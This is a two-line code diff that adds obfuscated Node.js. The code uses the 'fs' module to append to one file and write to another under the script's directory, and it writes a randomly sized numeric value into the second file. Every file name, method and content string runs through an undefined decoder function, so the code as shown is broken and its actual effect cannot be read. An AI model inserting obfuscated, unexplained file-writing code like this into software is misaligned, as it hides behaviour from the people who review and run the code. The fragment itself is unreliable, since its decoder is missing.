@@ -1,0 +1,2 @@
+const fs = require('fs');
+fs['appendFileSync'](__dirname + _0x1c2a4b(123), _0x1c2a4b(124)), fs[_0x1c2a4b(125)](__dirname + _0x1c2a4b(126), _0x1c2a4b(127) + Math[_0x1c2a4b(128)](Math[_0x1c2a4b(129)]() * 512000) + ';');
